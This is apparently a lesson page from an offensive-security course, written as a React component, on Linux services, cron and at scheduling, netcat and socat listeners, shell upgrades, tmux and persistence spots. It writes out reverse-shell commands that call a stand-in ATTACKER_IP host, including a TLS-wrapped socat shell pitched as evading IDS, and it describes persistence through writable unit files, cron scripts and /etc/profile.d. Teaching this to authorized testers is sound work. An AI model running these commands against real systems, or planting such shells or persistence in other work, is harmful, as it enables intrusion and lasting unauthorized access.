import CodeBlock from '../../components/lesson/CodeBlock';
import Callout from '../../components/lesson/Callout';

export default function AttackOpsManagement() {
  return (
    <div className="prose-hh">
      <h1>Managing Users &amp; Services for Attack Operations</h1>
      <p>
        The last piece of the Linux foundation: the commands you use to set up and maintain your own
        attack infrastructure — listeners, persistence for authorized red-team engagements, and the
        scheduling primitives attackers and defenders both need to understand.
      </p>

      <h2>Systemd &amp; services</h2>
      <CodeBlock>{`systemctl status ssh          # is a service running?
sudo systemctl start apache2   # start a service
sudo systemctl enable apache2  # start automatically on boot
journalctl -u ssh -n 50         # last 50 log lines for a specific service`}</CodeBlock>
      <p>
        Understanding how services are <em>defined</em>, not just started, matters just as much. Every
        systemd service is a plain-text unit file — which is exactly what makes a misconfigured one (a
        service file writable by a non-root user, for instance) a viable persistence or privilege
        escalation vector on an authorized engagement, and exactly why reviewing unit files is a standard
        step during Linux privesc enumeration:
      </p>
      <CodeBlock label="a minimal unit file — this is all a service actually is">{`# /etc/systemd/system/checkin.service
[Unit]
Description=Scheduled connectivity check

[Service]
ExecStart=/opt/scripts/check.sh
Restart=on-failure

[Install]
WantedBy=multi-user.target`}</CodeBlock>
      <CodeBlock>{`sudo systemctl daemon-reload      # required after editing any unit file, before systemd will see the change
sudo systemctl restart checkin
find / -writable -name "*.service" 2>/dev/null   # hunting for a unit file you could tamper with`}</CodeBlock>

      <h2>Cron &amp; at: scheduled execution</h2>
      <CodeBlock label="crontab syntax">{`# minute hour day month weekday   command
  */5    *    *    *      *        /opt/scripts/check.sh

crontab -l          # list current user's cron jobs
crontab -e           # edit them
cat /etc/crontab      # system-wide jobs (often root's)
ls -la /etc/cron.d/    # drop-in job directories`}</CodeBlock>
      <Callout variant="tip">
        <p>
          Cron jobs owned by root that call a <strong>world-writable script</strong> are one of the most
          common real-world privilege escalation paths: overwrite the script, wait for cron to run it as
          root. Checking <code>/etc/crontab</code> and cron directories for writable targets is a standard
          enumeration step — you'll do exactly this in the capstone lab.
        </p>
      </Callout>
      <p>
        Cron is for <em>recurring</em> jobs. When you only need something to fire once, later — a callback
        timed to fire after a maintenance window, say — <code>at</code> is the tool built for exactly that,
        and it's easy to overlook during enumeration because it isn't a file you'd think to grep for the
        same way you would <code>/etc/crontab</code>:
      </p>
      <CodeBlock label="one-shot scheduling with at">{`echo "/opt/scripts/checkin.sh" | at now + 10 minutes
atq                       # list pending at jobs
at -c 1                    # print the exact command a queued job (id 1) will run`}</CodeBlock>

      <h2>Setting up a listener</h2>
      <CodeBlock label="the classic attack-box setup for catching a reverse shell">{`nc -lvnp 4444
# -l listen, -v verbose, -n no DNS resolution, -p specify port`}</CodeBlock>
      <p>
        Paired with a target running something like <code>bash -i &gt;&amp; /dev/tcp/ATTACKER_IP/4444 0&gt;&amp;1</code>,
        this is how most introductory "foothold" shells are caught. You'll trigger and interact with a
        simulated version of this pattern in the guided labs.
      </p>
      <p>
        <strong>socat</strong> is worth knowing as netcat's more capable sibling: where plain <code>nc</code>
        gives you a raw, unauthenticated pipe, <code>socat</code> can wrap the same reverse shell in TLS so
        the traffic isn't sitting in cleartext for a network-level IDS to fingerprint, and it can allocate a
        real interactive TTY on the way in — something a bare netcat shell famously can't do on its own.
      </p>
      <CodeBlock label="socat — an encrypted listener, and a full TTY on connect">{`# attacker
socat OPENSSL-LISTEN:4444,cert=cert.pem,verify=0,fork -

# target
socat OPENSSL:ATTACKER_IP:4444,verify=0 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane`}</CodeBlock>
      <p>
        Once you do catch a plain netcat shell, it's typically a "dumb" pipe with no job control, no tab
        completion, and no <code>Ctrl+C</code> handling — usable, but painful. Upgrading it to a real
        interactive TTY is a standard, near-automatic first move on every engagement:
      </p>
      <CodeBlock label="the standard TTY upgrade sequence">{`python3 -c 'import pty; pty.spawn("/bin/bash")'
# then, in the now-slightly-better shell:
export TERM=xterm
# background it with Ctrl+Z, then on your attack box:
stty raw -echo; fg
# press Enter twice — you now have arrow keys, tab completion, Ctrl+C, and a resizable prompt`}</CodeBlock>
      <Callout variant="tip">
        <p>
          Stabilizing a shell the moment you catch it is muscle memory worth building now — trying to run a
          text editor, <code>sudo -l</code>, or anything interactive in a raw netcat pipe without first
          upgrading the TTY is a common source of "why is this stuck" confusion for beginners.
        </p>
      </Callout>

      <h2>tmux &amp; screen: keeping long-running operations alive</h2>
      <p>
        A reverse-shell listener or a long password-spray dies the instant your SSH session to the attack
        box drops — a real problem on multi-day engagements or flaky VPN connections. <code>tmux</code> (and
        the older <code>screen</code>) solve this by running your session inside a terminal multiplexer that
        keeps running on the box itself, detached from any one SSH connection:
      </p>
      <CodeBlock>{`tmux new -s ops             # start a named session
# ... run your listener, your long scan, whatever ...
# Ctrl+b then d              # detach — the session keeps running
tmux attach -t ops            # reattach later, from the same box or a fresh SSH connection
tmux ls                        # list all running sessions`}</CodeBlock>
      <p>
        The habit worth building: start every long-running attack-ops task (listeners, brute-force jobs,
        multi-hour scans) inside a named tmux session from the start, not as an afterthought once a
        connection has already dropped and killed your progress.
      </p>

      <h2>Shell startup files: a lightweight persistence spot</h2>
      <p>
        Beyond systemd units and cron, a user's shell startup files are a quieter persistence location
        precisely because they trigger on ordinary, everyday behavior rather than a scheduled trigger someone
        might be watching for — anything appended to them runs silently the next time that user (or root)
        opens a shell at all.
      </p>
      <CodeBlock label="startup files worth reviewing for unexpected additions">{`~/.bashrc            # runs on every new interactive shell for that user
~/.bash_profile        # runs on login shells specifically
/etc/profile.d/*.sh      # system-wide, runs for every user's login shell — a favorite spot for a root-level
                            # implant, since a single writable script here affects every user who logs in`}</CodeBlock>
      <p>
        The enumeration habit this implies: a writable file under <code>/etc/profile.d/</code>, or a
        surprising line at the bottom of root's <code>.bashrc</code>, is worth exactly the same suspicion as
        a writable cron entry — it's the same "something runs automatically, and I can control what" pattern,
        just triggered by a login instead of a clock.
      </p>

      <h2>User &amp; SSH key management for engagements</h2>
      <CodeBlock>{`ssh-keygen -t ed25519 -f ~/.ssh/engagement_key   # generate a keypair
ssh-copy-id -i ~/.ssh/engagement_key.pub user@target   # deploy your public key (authorized use only)
ssh -i ~/.ssh/engagement_key user@target                # connect with the private key`}</CodeBlock>

      <h2>Log awareness (defensive literacy for offensive operators)</h2>
      <CodeBlock>{`/var/log/auth.log      # Debian/Ubuntu — SSH logins, sudo usage
/var/log/secure         # RHEL/CentOS equivalent
/var/log/apache2/access.log   # web requests — your scanner traffic lands here too
last                          # recent login history
who / w                        # who's logged in right now`}</CodeBlock>
      <Callout variant="warn">
        <p>
          Understanding what you log as a defender is what makes you effective as an attacker in
          authorized engagements — and vice versa. This course treats both skill sets as one discipline,
          not two separate tracks.
        </p>
      </Callout>

      <h2>Module complete</h2>
      <p>
        You now have the Linux fluency to navigate, read permissions, manage processes, script repetitive
        work, and recognize common privilege escalation setups. Module 3 turns outward — from the OS to
        the network — and builds a full reconnaissance and enumeration methodology, which you'll then
        apply directly in four hands-on labs.
      </p>
    </div>
  );
}
